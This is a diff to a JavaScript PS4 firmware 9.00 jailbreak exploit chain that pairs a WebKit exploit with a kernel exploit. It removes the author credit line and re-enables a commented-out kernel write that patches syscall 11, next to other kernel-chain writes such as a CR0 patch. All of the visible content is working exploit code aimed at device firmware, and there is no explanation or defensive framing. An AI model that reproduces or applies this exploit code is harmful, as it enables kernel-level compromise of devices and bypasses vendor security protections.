@@ -1,4 +1,3 @@
-/////////////////////// PS4 9.00 Exploit Chain restructured/reorganised By Leeful (Original Webkit and Kernel Exploits By Sleirsgoevy & ChendoChap)
 const OFFSET_wk_vtable_first_element = 0x104F110;
 const OFFSET_WK_memset_import = 0x000002A8;
 const OFFSET_WK___stack_chk_fail_import = 0x00000178;
@@ -619,7 +618,7 @@ function kernelExploit() {
   kchain2.kwrite1(KERNEL_mmap_1, 0x37);
   kchain2.kwrite1(KERNEL_mmap_2, 0x37);
   kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
-//  kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
+  kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
   kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);
   kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
   var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
